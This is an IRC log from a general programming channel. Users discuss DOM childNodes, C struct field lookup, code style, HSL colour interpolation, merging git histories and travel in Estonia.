[13:30:16] *** Joins: edgar-rft (~edgar-rft@HSI-KBW-109-193-249-223.hsi7.kabel-badenwuerttemberg.de)
[13:32:11] *** Quits: no_gravity (~no_gravit@user/no-gravity/x-5639427) (Quit: leaving)
[13:32:49] *** Joins: peteyboy1 (~peteyboy1@95.169.232.161)
[13:34:32] *** Joins: Joanna (uid57472@id-57472.lymington.irccloud.com)
[13:35:48] *** Joins: hans (~hans@36.84-48-255.nextgentel.com)
[13:36:06] <hans> ele.firstChild is a text node; BUT ele.children is EMPTY
[13:36:23] <hans> (well, it's an empty HTMLCollection object, which is basically an empty array)
[13:36:24] <flakland> ohhhhhhnooooooooooooo
[13:36:29] <hans> how the balls does that make sense
[13:36:33] <hans> it has a firstChild but no children
[13:37:11] <flakland> are empty sets useful?
[13:37:41] <hans> not in my situation
[13:38:00] <flakland> i was just wondering in general what they're applied to
[13:38:21] <ski> two sets being disjoint is defined as their intersection being empty
[13:38:26] <d3x0r> as a starting point to add things to
[13:39:21] <ski> without having empty set, you couldn't take the intersection of two sets, without already knowing they have at least one element in common
[13:40:08] <ski> hans : apparently `ele.children' are the remaining ones ?
[13:40:21] *** Quits: edgar-rft (~edgar-rft@HSI-KBW-109-193-249-223.hsi7.kabel-badenwuerttemberg.de) (Quit: Leaving)
[13:40:42] <hans> children was supposed to be all the children (not the grandchildren though, just the direct children)
[13:40:59] <ski> then i guess something's not right
[13:41:21] <hans> aaanyway, seems .children and .childNodes are different, .childNodes has what what i want, including .firstChild (but .children does not)
[13:41:22] <hans> blah
[13:41:48] <d3x0r> https://stackoverflow.com/questions/7935689/what-is-the-difference-between-children-and-childnodes-in-javascript
[13:41:50] <bayaz> Title: What is the difference between children and childNodes in JavaScript? 
[13:42:05] <d3x0r> yup
[13:42:24] <hans> yeah.
[13:42:33] <hans> that sounds about right.
[13:43:37] *** Quits: dsrt^ (~dsrt@wsip-98-188-242-6.mc.at.cox.net) (Remote host closed the connection)
[13:44:12] *** Joins: ThePhilgrim2 (~ThePhilgr@151.41.4.252)
[13:45:49] *** Quits: ThePhilgrim (~ThePhilgr@151.41.8.149) (Ping timeout: 268 seconds)
[13:46:37] <user51> wtf i love lisp now
[13:46:52] <user51> joking aside, it feels like the parsing would be easier in lisp than c or awk :)
[13:49:16] <ski> parsing ?
[13:49:29] *** Quits: derjanni (~textual@ip-88-153-100-48.hsi04.unitymediagroup.de) (Read error: Connection reset by peer)
[13:50:00] *** Quits: ThePhilgrim2 (~ThePhilgr@151.41.4.252) (Quit: Leaving)
[13:50:12] *** Quits: wildo (~lain6141@119.224.72.222) (Quit: leaving)
[13:50:48] <user51> er, more specifically, it's translating a diagrammed syntax tree into source code
[13:51:17] <user51> i have a few ideas but doing them in either c or awk would be quite painful. pyzozord can back me up on that!
[13:52:46] *** Joins: bluehoney (~bluehoney@cpe-75-81-204-188.mi.res.rr.com)
[13:54:09] *** Joins: bud (~bud@user/bud)
[13:56:24] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[13:58:08] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[13:59:44] <ski> sounds more like unparsing (aka serializing/linearizing, or possibly pretty-printing), to me
[14:09:49] *** Joins: GeDaMo (~GeDaMo@82-69-2-253.dsl.in-addr.zen.co.uk)
[14:09:49] *** Quits: GeDaMo (~GeDaMo@82-69-2-253.dsl.in-addr.zen.co.uk) (Changing host)
[14:09:49] *** Joins: GeDaMo (~GeDaMo@user/gedamo)
[14:09:53] *** Joins: kenanmarasli (~kenanmara@user/kenanmarasli)
[14:11:42] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Ping timeout: 268 seconds)
[14:11:50] *** Joins: rexar89 (~alexi5@208.83.82.234)
[14:11:53] <rexar89> hello
[14:12:26] *** Joins: ixil (~ixil@82.197.178.137)
[14:12:35] <rexar89> what is tyhe typical use case for a database like mongodb is used ?
[14:12:50] *** Quits: ixil (~ixil@82.197.178.137) (Remote host closed the connection)
[14:13:10] *** Joins: ixil (~ixil@82.197.178.137)
[14:15:41] *** Quits: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net) (Quit: Textual IRC Client: www.textualapp.com)
[14:17:03] <biberu> you could e.g. store homework answers in it
[14:17:19] <rexar89> :)
[14:17:56] *** Joins: msmhnd^ (~msmhnd@wsip-98-188-242-6.mc.at.cox.net)
[14:18:42] *** Quits: AsenMx (~AsenMx@78.90.248.234) (Ping timeout: 260 seconds)
[14:19:28] <rexar89> I am jsut curious to know how it is used in the industry
[14:19:42] <rexar89> from developers who may have used it
[14:19:59] *** Quits: whatsupdoc (uid509081@id-509081.hampstead.irccloud.com) (Quit: Connection closed for inactivity)
[14:20:20] *** Joins: gitesh (uid423739@id-423739.ilkley.irccloud.com)
[14:20:59] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[14:21:31] *** Joins: LucaTM (~LucaTM@user/lucatm)
[14:21:42] <d3x0r> anything yu'd use any other data stroage thng for
[14:22:25] <biberu> rexar89: you could look for trade offs between nosql or document databases and relational databases, that should give an overview
[14:23:43] <biberu> rexar89: in real life you'd look at actual requirements and try to match those against available tools and patterns
[14:23:45] <arahael> rexar89: It all depends on the structure of the data you have/want, the schema of that data or lack of a schema, and how you want to store/retrieve it.
[14:24:33] <bud> can someone post a download link to "real life"?
[14:24:47] <d3x0r> http://getalife.org
[14:24:51] <bud> thank
[14:25:25] *** Joins: mrig (~AdiIRC@user/mrig)
[14:26:53] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[14:27:50] *** Joins: mickey8 (~user@user/mickey)
[14:28:14] *** Joins: pingpongball (~pingpongb@103.94.252.92)
[14:29:36] *** Quits: chomwitt (~chomwitt@2a02:587:dc02:9f00:12c3:7bff:fe6d:d374) (Ping timeout: 268 seconds)
[14:30:50] *** Quits: bluehoney (~bluehoney@cpe-75-81-204-188.mi.res.rr.com) (Ping timeout: 260 seconds)
[14:35:14] *** Joins: cthulchu (~Cthulchu@193.194.107.250)
[14:35:14] *** Joins: cthulchu_ (~Cthulchu@193.194.107.250)
[14:37:09] *** Joins: bomb (~bomb@user/bomb)
[14:37:32] <pyzozord> user51: agreed about awk, not sure about c
[14:38:43] *** Quits: masta`` (~oyster@user/masta/x-2645138) (Remote host closed the connection)
[14:38:43] <arahael> Nothing like implementing a simple protocol to get insight about how a much more complex protocol is implemented. :)
[14:39:00] *** Joins: Mangy_Dog (Mange@user/mangy-dog/x-7397214)
[14:39:02] <user51> pyzozord: c could do it, but it does require some tables
[14:41:59] <pyzozord> but I do find javascript easier to code in than c
[14:42:02] <pyzozord> at least at the moment
[14:42:33] <arahael> pyzozord: Have you considered why it's easier?
[14:43:01] <pyzozord> not because c is lacking anything, but because javascript is pretty much typeless and very malleable
[14:43:45] <pyzozord> arahael: probably mostly because I've spent years (if not decades) coding javascript every day, and C is really only few months in total
[14:44:01] *** Joins: cadmio (~cadmio@151.25.148.168)
[14:44:05] <cadmio> Hello
[14:44:09] <bomb> hi
[14:44:16] <bud> hej hej
[14:44:27] <arahael> Fair. :)  But I would suggest that being able to pass data structures directly is a big part of it, and not having to deal with memory.
[14:44:30] <cadmio> here https://paste.gnome.org/plmzzjjmz#line-142 for some reason litos->filename[page] is set to NULL
[14:44:31] <bayaz> Title: GNOME Pastebin 
[14:47:45] <arahael> pyzozord: Have you considered using typescript?
[14:48:49] *** Quits: rustyshackleford (uid236774@id-236774.helmsley.irccloud.com) (Quit: Connection closed for inactivity)
[14:50:46] <pyzozord> arahael: I'm using ts I'd say about 4 years pretty much exclusively
[14:51:26] *** Joins: CoderGuy2 (~CoderGuy@2601:644:101:4f20:f42c:9c0:41b2:ff81)
[14:51:29] <arahael> pyzozord: Very nice, that improves things quite a bit.
[14:52:00] <pyzozord> yeah, it makes sense for work environment
[14:52:35] <pyzozord> but I think that type systems are useful for commercial or complex software
[14:53:04] <pyzozord> I'm not sure how realistic that is, but I'd prefer to write such small programs that type systems aren't really necessary
[14:53:26] <arahael> You should try using languages that *really* make effective use of type systems.
[14:54:00] <arahael> Eg, Haskell lets you put in a token that asks the compiler: Please tell me the type that should be used here, and while you do that, also tell me of the candidate functions that fit the type".
[14:54:44] <GeDaMo> https://hoogle.haskell.org/
[14:54:46] <bayaz> Title: Hoogle 
[14:54:53] <arahael> It's amazing.
[14:54:59] *** Quits: CoderGuy (~CoderGuy@user/coderguy) (Ping timeout: 264 seconds)
[15:00:58] *** Joins: otisolsen70 (~otisolsen@80.80.4.2)
[15:04:23] *** Joins: trace987 (~trace@ip5b429941.dynamic.kabel-deutschland.de)
[15:07:11] *** Quits: DnzAtWrk (~DnzAtWrk@mobile-access-567363-170.dhcp.inet.fi) (Quit: Leaving)
[15:12:08] *** Joins: masta`` (~oyster@user/masta/x-2645138)
[15:16:20] *** Joins: bluehoney (~bluehoney@cpe-75-81-204-188.mi.res.rr.com)
[15:16:42] *** Joins: tomathy (~jenova@user/quetzl)
[15:20:18] *** Quits: pingpongball (~pingpongb@103.94.252.92) (Quit: Client closed)
[15:20:29] *** Joins: Xalphor (~hil@193.203.2.244)
[15:20:43] <Jck_true> Well and we have to be honest. C can be a real pain for certain tasks :P 
[15:20:47] *** Quits: mjs2600 (~mjs2600@c-24-91-3-49.hsd1.vt.comcast.net) (Ping timeout: 268 seconds)
[15:20:54] *** Parts: cadmio (~cadmio@151.25.148.168) (WeeChat 3.0)
[15:21:03] <bud> is there a way to use a string (gchar *) to reference a "property" in a struct in C ?
[15:21:06] <bud> https://0x0.st/-5qy.txt
[15:21:07] <bayaz> Type: text/plain; charset=utf-8 Size: 351 B 
[15:21:44] <d3x0r> yes, if( strcmp( string, "field1" ) === 0 ) return struct->field1;
[15:21:47] *** Quits: mobidrop (~mobidrop@user/mobidrop) (Remote host closed the connection)
[15:21:52] <d3x0r> - =
[15:22:05] *** Joins: mobidrop (~mobidrop@user/mobidrop)
[15:22:20] <bud> but struct->field1 , field1 is hardcoded there.
[15:22:31] <bud> i wanted something like struct->[string] 
[15:22:32] <d3x0r> so it's referenced by a variable
[15:22:42] <d3x0r> and that variable can only be certain things otherwise there's no value
[15:22:49] <d3x0r> ya, no.
[15:22:54] <arahael> bud: You can't do that (with structs) in C.
[15:22:57] *** Quits: kenanmarasli (~kenanmara@user/kenanmarasli) (Read error: Connection reset by peer)
[15:23:13] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[15:23:28] *** Joins: mickey8 (~user@user/mickey)
[15:23:36] <d3x0r> you can make an abtract list type that has list { [ {field,value},... ] } 
[15:24:18] <d3x0r> the preprocessor has thiings to stringify names, but not destringify
[15:25:57] *** Quits: masta`` (~oyster@user/masta/x-2645138) (Read error: Connection reset by peer)
[15:26:00] <pyzozord> I think python maybe comes close the perfect (tradional) syntax for me
[15:26:10] *** Quits: penguino (~mrpenguin@user/mrpenguin) (Remote host closed the connection)
[15:26:12] *** Joins: AsenMx (~AsenMx@78.90.248.234)
[15:26:12] *** Joins: kenanmarasli (~kenanmara@user/kenanmarasli)
[15:28:22] <Jck_true> bud: Not possible sorry :)
[15:29:08] <bud> thanks guys
[15:29:10] <Jck_true> bud: When you compile C variable names etc are discarded 
[15:29:21] <d3x0r> but it IS possible :)
[15:29:27] <d3x0r> if it's wat you really want to do
[15:30:08] <bud> it is not important to what i am doing, i just thought it would be neat, and was curious if it worked at all.
[15:30:36] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[15:30:49] *** Joins: milkt (~debian@gateway/tor-sasl/milkt)
[15:32:05] <bud> https://0x0.st/-5qt.txt
[15:32:07] <bayaz> Type: text/plain; charset=utf-8 Size: 826 B 
[15:32:37] <bud> this works fine ^ , but it could have been done "cleaner" with a for loop is that thing worked.
[15:32:40] <d3x0r> right... xml/json path lookup
[15:34:13] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[15:34:30] *** Joins: mickey8 (~user@user/mickey)
[15:34:30] <GeDaMo> You could have an array mapping names to values / addresses
[15:34:35] <d3x0r> https://github.com/d3x0r/SACK/blob/master/src/utils/localStorage/localStorageServer.c#L46 bud - this is using a parsed result from JSON - it is a list of 'jsox_value_container's ... not really any better
[15:34:36] <bayaz> Title: SACK/localStorageServer.c at master · d3x0r/SACK 
[15:34:57] *** Quits: Khoyo (~khoyo@user/khoyo) (Ping timeout: 268 seconds)
[15:34:59] <d3x0r> you don't know the order of the values 
[15:35:01] *** Quits: bomb (~bomb@user/bomb) (Quit: reboot required)
[15:35:05] <bud> thanks!
[15:35:10] *** Quits: milkt (~debian@gateway/tor-sasl/milkt) (Client Quit)
[15:35:34] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[15:37:33] *** Quits: password (~password@user/password2) (Ping timeout: 256 seconds)
[15:39:47] *** Quits: hans (~hans@36.84-48-255.nextgentel.com) (Read error: Connection reset by peer)
[15:40:13] *** Joins: Khoyo (~khoyo@user/khoyo)
[15:40:46] *** Joins: hans (~hans@36.84-48-255.nextgentel.com)
[15:41:26] *** Joins: password (~password@user/password2)
[15:42:16] *** Quits: penguino (~mrpenguin@user/mrpenguin) (Remote host closed the connection)
[15:42:47] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[15:42:59] *** Quits: jaysicks (~jaysicks@178-164-135-126.pool.digikabel.hu) (Ping timeout: 264 seconds)
[15:43:05] *** Joins: mjs2600 (~mjs2600@c-24-91-3-49.hsd1.vt.comcast.net)
[15:44:16] *** Quits: penguino (~mrpenguin@user/mrpenguin) (Remote host closed the connection)
[15:44:21] *** Quits: AsenMx (~AsenMx@78.90.248.234) (Ping timeout: 256 seconds)
[15:44:32] <bud> i don't have my ways set yet. which indentation is least bad? https://0x0.st/-5qE.txt
[15:44:34] <bayaz> Type: text/plain; charset=utf-8 Size: 829 B 
[15:44:41] <bud> inb4 spaces
[15:44:43] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[15:45:34] *** Joins: v01d4lph4 (~v01d4lph4@user/v01d4lph4)
[15:45:49] <d3x0r> 3, but the && should be on the next line
[15:46:07] <bud> true, i always do that in shell
[15:46:31] <d3x0r> leadin operators are easy to read and get the gist of the logic of a thing
[15:46:38] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[15:46:46] <bud> i agree
[15:46:54] *** Joins: mickey8 (~user@user/mickey)
[15:47:16] <bud> but i have recently started not liking the ... )) { (3)
[15:48:23] <lind{at}yahoo> why is that method in all caps?
[15:48:37] <bud> its a macro (from the library)
[15:48:41] *** Joins: AsenMx (~AsenMx@78.90.248.234)
[15:48:55] <lind{at}yahoo> and yes #3
[15:49:16] <lind{at}yahoo> silly lib authors
[15:49:46] *** Joins: loganlee (~Thunderbi@user/loganlee)
[15:50:04] *** Joins: BrianG61UK__ (~BrianG61U@2a02:8010:66b7:dddd:cd85:64ac:7bb4:96e6)
[15:50:38] *** Quits: v01d4lph4 (~v01d4lph4@user/v01d4lph4) (Ping timeout: 260 seconds)
[15:51:12] <bud> https://0x0.st/-5qd.png , this authout is particularly silly...
[15:51:13] <bayaz> Type: image/png Size: 417.8 kB 
[15:51:30] <bud> >Authors: Emmanuele Bassi
[15:51:31] <bud> ...
[15:52:05] <bud> note that the name of the function macros are not right, NODE_... , correct JSON_NODE_...
[15:52:39] <bud> also note that the documentation is not online, i needed to build the library with docs option and load docs from local filesystem.
[15:53:04] *** Quits: loganlee (~Thunderbi@user/loganlee) (Client Quit)
[15:53:27] <bud> json-glib is also very slow in comparison to any other json library...
[15:53:28] *** Quits: password (~password@user/password2) (Ping timeout: 268 seconds)
[15:53:28] *** Quits: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:cd85:64ac:7bb4:96e6) (Ping timeout: 268 seconds)
[15:53:28] *** Quits: BrianG61UK_ (~BrianG61U@2a02:8010:66b7:dddd:d8fb:653:7302:119b) (Ping timeout: 268 seconds)
[15:53:54] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[15:53:57] <d3x0r> termianls are generaly able to be pretty wide so 1)  { at the end doesn't exceed length.   2) otherwise { is a blank line and there's fewer lines than columes 3) the next line is indented anyway so even without the { it's aboe to be seen as ablock
[15:54:24] *** Joins: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:cd85:64ac:7bb4:96e6)
[15:54:33] *** Quits: bluehoney (~bluehoney@cpe-75-81-204-188.mi.res.rr.com) (Ping timeout: 256 seconds)
[15:54:33] *** Joins: BrianG61UK_ (~BrianG61U@2a02:8010:66b7:dddd:d8fb:653:7302:119b)
[15:54:55] <bud> i think its more readable when { is on its own line.
[15:54:59] *** Quits: otisolsen70 (~otisolsen@80.80.4.2) (Quit: Leaving)
[15:55:28] <bud> and i have a soft-limit on lines to 50 chars
[15:55:43] <PlanckWalk> That's ... pretty short.
[15:55:46] <d3x0r> that's so 70's :)
[15:55:52] <bud> :)
[15:56:02] <bud> i like big fonts 
[15:56:15] <d3x0r> big font's isn't just wide...
[15:56:31] *** Joins: jaysicks (~jaysicks@178-164-181-41.pool.digikabel.hu)
[15:56:31] <bud> the larger the font size, the less the collumns
[15:56:41] <d3x0r> and rows if you're down to 50 on 16:9
[15:56:47] <mickey8> uhm maybe you guys are going to save my weekend now
[15:56:52] <d3x0r> that's like 6? 7? rows of code?
[15:56:57] <mickey8> i have a variable with value between -1 and 1
[15:57:08] <InPhase> mickey8: It's 0 isn't it.
[15:57:09] *** Quits: BrianG61UK__ (~BrianG61U@2a02:8010:66b7:dddd:cd85:64ac:7bb4:96e6) (Ping timeout: 268 seconds)
[15:57:27] <mickey8> and i need my function to determine which color to assign to it
[15:57:35] *** Joins: spaceangel (~spaceange@ip-89-176-181-220.net.upcbroadband.cz)
[15:57:39] <mickey8> where -1 is as red as red can be, and 1 is green
[15:57:41] <d3x0r> mickey8 langguage?
[15:57:50] <mickey8> 0 can be orange, yellow or something similar
[15:58:05] <mickey8> the input is some 10 digits after the dot
[15:58:48] <mickey8> d3x0r go, but anything i could reasonably read would be great, i'll just rewrite it
[15:59:07] <GeDaMo> You want to turn -1..1 into what? RGB?
[15:59:21] <PlanckWalk> HSL would make it easy
[15:59:25] <PlanckWalk> Or HSV
[15:59:39] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Ping timeout: 256 seconds)
[15:59:39] <d3x0r> https://github.com/d3x0r/SACK/blob/master/src/imglib/image_common.c#L166-L180  this works with 0-N...   takes 2 colors, averages the compontents with d g
[15:59:40] <bayaz> Title: SACK/image_common.c at master · d3x0r/SACK 
[15:59:46] <d3x0r> it is an RGB 
[15:59:59] <PlanckWalk> Since then red = hue 0, green = hue 120
[16:00:10] <d3x0r> It might make sense to treat them as HSV and do the same thing
[16:00:14] *** Quits: xsperry (~xs@user/xsperry) ()
[16:00:32] *** Joins: night_wulfe_ (~wulfe@cpe-174-103-156-213.cinci.res.rr.com)
[16:00:41] <PlanckWalk> In RGB the easiest would probably be linear interpolation
[16:01:00] <PlanckWalk> But the colour corresponding to 0 would be a muddy sort of olive
[16:01:12] <PlanckWalk> In HSL or HSV it's yellow
[16:01:26] <InPhase> mickey8: For val -1 to 1:  hue = 2*PI*(val+1)/6; bright=0.5; sat=0.49; r = bright+sat*cos(hue); g = bright+sat*cos(hue+PI*2/3); b = bright+sat*cos(hue+PI/3);
[16:01:28] *** Quits: Khoyo (~khoyo@user/khoyo) (Ping timeout: 268 seconds)
[16:01:42] <mickey8> InPhase there goes my weekend...
[16:02:01] *** Quits: tomathy (~jenova@user/quetzl) (Quit: Leaving)
[16:02:06] *** Joins: akevinhuang (~thekevinh@user/thekevinhuang)
[16:03:15] *** Joins: arcatech (~arcatech@user/arcatech)
[16:03:21] *** Joins: chomwitt (~chomwitt@ppp-2-85-245-90.home.otenet.gr)
[16:04:11] *** Joins: Khoyo (~khoyo@user/khoyo)
[16:04:13] <mickey8> HSL is a great idea.
[16:04:17] <mickey8> thanks for that tip!
[16:04:33] *** Quits: night_wulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com) (Ping timeout: 268 seconds)
[16:05:26] <Trashlord> yeah, it helps you travel easily around Helsinki
[16:06:05] <bud> *Helsingfors
[16:07:24] <InPhase> Trashlord: :)
[16:08:35] *** Quits: AsenMx (~AsenMx@78.90.248.234) (Quit: Leaving)
[16:08:47] <bud> https://0x0.st/-5br.txt that feel when your own code makes you sick..
[16:08:47] *** Quits: arcatech (~arcatech@user/arcatech) (Ping timeout: 264 seconds)
[16:08:50] <bayaz> Type: text/plain; charset=utf-8 
[16:08:52] *** Joins: AsenMx (~AsenMx@78.90.248.234)
[16:09:29] <InPhase> bud: Someone should invent a thing called functions to reduce repetitiveness of code.
[16:09:46] <bud> ikr
[16:10:32] *** Joins: hqdruxn08_ (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com)
[16:10:53] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[16:11:03] <bud> or i would do a function, or at least for loop, but i am to stupid to do that settings->modules_[name] thing, which hinders me.
[16:11:08] *** Joins: mickey8 (~user@user/mickey)
[16:11:33] *** Joins: gareppa (~gareppa@user/gareppa)
[16:11:34] <bud> i guess i could do f("left", settings->modules_left); ..
[16:11:51] *** Quits: AsenMx (~AsenMx@78.90.248.234) (Client Quit)
[16:11:54] <InPhase> Yep.
[16:12:02] <bud> yeah, i will try that.
[16:12:12] *** Joins: AsenMx (~AsenMx@78.90.248.234)
[16:12:15] *** Quits: gareppa (~gareppa@user/gareppa) (Client Quit)
[16:13:42] <InPhase> And with a third parameter defaulted to json_object_get_array_member, and passed otherwise.
[16:13:51] *** Quits: AsenMx (~AsenMx@78.90.248.234) (Changing host)
[16:13:51] *** Joins: AsenMx (~AsenMx@user/asenmx)
[16:14:14] *** Quits: AsenMx (~AsenMx@user/asenmx) (Remote host closed the connection)
[16:14:33] *** Joins: AsenMx (~AsenMx@user/asenmx)
[16:14:54] *** Quits: hqdruxn08 (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com) (Ping timeout: 260 seconds)
[16:15:49] <InPhase> For the else, set the default if it exists in the defaults, otherwise don't?
[16:16:23] <bud> not sure i follow?
[16:16:36] <InPhase> You set a default on else for 2 values.
[16:16:55] <bud> yeah, the defaults always exist, they are "hard coded"
[16:17:01] *** Joins: Myr (~Thunderbi@user/myr)
[16:17:32] <InPhase> And for the ones where you have no else?
[16:18:09] <bud> then leave modules_* to null
[16:18:19] <bud> (they can be NULL/unset)
[16:18:41] <bud> https://0x0.st/-5bH.json <- this is config.json
[16:18:43] <bayaz> Type: application/json Size: 182 B 
[16:18:50] <InPhase> I don't know what those json object get functions do if there's no value.  Do they return null?
[16:18:51] <Myr> I'm trying to append the history of a git repository to the history of another git repository. How would I do this? The state/files of the first commit in the second repo is equal to the state/files in the last commit of the first repo.
[16:19:05] <Myr> Can't find a SO post about it either
[16:19:16] <bud> the user could chose not to have f.i. a layout.left thing, but the others..
[16:19:46] *** Joins: lionkor (~lionkor@beammp/staff/lionkor)
[16:19:57] <InPhase> Myr: Fetch it into a branch and merge?
[16:20:16] <bud> but i test if they have the right values (JSON_NODE_HOLDS_* before getting. object_has_member returns boolean
[16:21:54] <bud> *value-type
[16:22:01] <Myr> @InPhase: Thanks, that's not a bad idea actually :)
[16:22:41] <bud> reminds me i should git init this madness..
[16:22:42] *** Joins: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net)
[16:24:52] *** Joins: Pebbles (~Pebbles@171.160.220.111.dyn.iprimus.net.au)
[16:25:54] <bud> git has been really good for programming and OSS.
[16:26:24] <d3x0r> bah
[16:26:30] <d3x0r> monotone was so much better :)
[16:26:53] <d3x0r> it actually knew when you deleted a file or renamed a file
[16:26:56] <d3x0r> or moved a file
[16:27:08] <d3x0r> pivot_root is such a cool command
[16:27:34] <bud> git knows delete/rename? works on my machine.
[16:28:00] <bud> or maybe it only works when doing git add .
[16:28:04] <bud> hmm
[16:28:25] <bud> there is also git rm . and i guess git mv
[16:29:23] <d3x0r> but then go back to a previous point, fork and make a change to the file ... merge to the original; which has the file deleted, so any change should be null, not resurect the file
[16:29:28] *** Joins: password (~password@user/password2)
[16:29:54] <d3x0r> it also doesn't really know directories and move/rename break
[16:30:02] <bud> i only write correct code, and therefor i never need to delete anything.
[16:30:02] <mrig> C certainly requires a lot of patients! :)
[16:30:03] <d3x0r> you'll end up with duplicates on a marge
[16:30:28] *** Quits: mjs2600 (~mjs2600@c-24-91-3-49.hsd1.vt.comcast.net) (Ping timeout: 268 seconds)
[16:30:44] <d3x0r> it can DO the operations sure, but it doesn't actually track that operation well
[16:30:57] *** Joins: derjanni (~textual@p5ddafd7f.dip0.t-ipconnect.de)
[16:31:02] <d3x0r> I think it's that it doesnt' actually know directories
[16:31:21] *** Quits: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:cd85:64ac:7bb4:96e6) (Read error: Connection reset by peer)
[16:31:24] <mrig> ... and persistence.
[16:31:52] *** Joins: pingpongball (~pingpongb@103.94.252.92)
[16:32:16] <bud> i bet monotone had some quirks too. what is nice with git is that it has been more or less accepted by more or less everyone as a VSC standard.
[16:33:25] <d3x0r> monotone was slower - but a lot of monotone was actually borrowed by Linus
[16:33:35] <d3x0r> who admitted to trying it in an interview once so
[16:33:47] <d3x0r> it re-validated hashes a lot
[16:34:19] <d3x0r> if it was stored in a proper graph database I bet it'd do a lot better...
[16:34:30] <d3x0r> but it was also built on Boost and Boton for the crypt layer
[16:35:42] *** Joins: WilliamLeara (~wdl@cpe-76-185-2-28.tx.res.rr.com)
[16:36:22] *** MrMobius_ is now known as MrMobius
[16:37:35] *** Quits: lunarkitty (uid501895@user/pyra) (Quit: Connection closed for inactivity)
[16:37:57] *** Quits: absc (~absc@81.31.144.28) (Remote host closed the connection)
[16:39:34] *** Quits: Pebbles (~Pebbles@171.160.220.111.dyn.iprimus.net.au) (Quit: Have a groovy one)
[16:40:20] *** Joins: absc (~absc@81.31.144.28)
[16:41:17] <d3x0r> rick & morty - picky and the brain... btw new animaiacs season on hulu
[16:42:48] *** Quits: CrypticSquared (~CrypticS_@user/crypticsquared) (Ping timeout: 268 seconds)
[16:44:59] *** Quits: pingpongball (~pingpongb@103.94.252.92) (Quit: Client closed)
[16:52:28] *** Quits: johan (~johan@2001:9b1:25ff:c100::e7e) (Ping timeout: 260 seconds)
[16:53:20] *** Joins: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470)
[16:55:07] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[16:59:43] *** Quits: password (~password@user/password2) (Ping timeout: 256 seconds)
[17:00:51] *** Quits: triad (~triad@user/triad) (Ping timeout: 256 seconds)
[17:01:18] *** Quits: qbt (~qbt@user/edun) (Quit: Leaving.)
[17:01:29] *** Quits: jess (~jess@libera/staff/jess) ()
[17:02:19] <mrig> payshunts too ... So funny to spell in english after having learned some sanskrit :D
[17:02:29] *** Joins: CrypticSquared (~CrypticS_@user/crypticsquared)
[17:02:37] <mrig> to attempt to spell rather.
[17:03:45] *** Joins: bomb (~bomb@user/bomb)
[17:06:23] <mrig> It is crazy here in France, they will still analyse your handwriting even for the most menial jobs.
[17:06:26] * [itchyjunk] lights bomb fuse
[17:06:38] *** Joins: engest (~engest@50.39.188.0)
[17:07:30] *** Quits: hans (~hans@36.84-48-255.nextgentel.com) (Quit: Leaving)
[17:08:26] *** Joins: password4 (~password@user/password2)
[17:08:44] *** Joins: quartz (~quartz@user/quartz)
[17:08:58] *** Joins: shibboleth (~shibbolet@user/shibboleth)
[17:10:38] *** Joins: qbt (~qbt@user/edun)
[17:10:38] *** Quits: qbt (~qbt@user/edun) (Client Quit)
[17:11:46] <mspe> mrig: some old backwards fuckwits still do it, but they will soon disappear
[17:11:46] *** Quits: dodocrypto (~dodocrypt@user/dodocrypto) (Ping timeout: 268 seconds)
[17:12:33] *** Quits: absc (~absc@81.31.144.28) (Read error: Connection reset by peer)
[17:12:45] <mrig> mspe yes this is true, time marches on and old ideas die with the generations who cherish them.
[17:13:01] <mrig> So rude though.
[17:13:08] *** Joins: absc (~absc@81.31.144.28)
[17:13:20] <mspe> it's sadly slower to happen in france than other countries for some reason
[17:13:54] <mspe> I just spent over 2 weeks in Estonia, and coming back to France is depressing :/
[17:14:22] *** Joins: ThePhilgrim (~ThePhilgr@151.41.4.252)
[17:14:39] <pyzozord> lol I forgot that country exists
[17:15:11] <pyzozord> could be a cool place to live
[17:16:07] *** Joins: Inline (~Inline@2a02:908:1252:7a80:c927:fbd7:acc4:9375)
[17:16:24] *** Quits: absc (~absc@81.31.144.28) (Read error: Connection reset by peer)
[17:16:42] *** Joins: absc (~absc@81.31.144.28)
[17:16:59] <bomb> pyzozord France? yeah it's still around...
[17:18:01] <mspe> I drove over 1200 kms in Estonia for 10 days, visited Tallinn, Saaremaa island, Pärnu, Tartu, Narva, Lahemaa national park and 3 days again in Tallinn
[17:18:08] <mspe> seriously nice country
[17:19:52] <bomb> because you accidentally entered Finland? :P
[17:20:11] <[itchyjunk]> nice, i've never really travelled europe
[17:20:16] <[itchyjunk]> hope i get to one day
[17:20:37] <bomb> oh I thought you're from Germany [itchyjunk] 
[17:21:11] *** Quits: Inline (~Inline@2a02:908:1252:7a80:c927:fbd7:acc4:9375) (Quit: Leaving)
[17:21:25] <[itchyjunk]> nein
[17:22:07] *** Joins: X-Scale` (~ARM@165.201.137.78.rev.vodafone.pt)
[17:22:36] <mspe> bomb: we thought about doing a daytrip in Helsinki from Tallin, but it'll be for next time
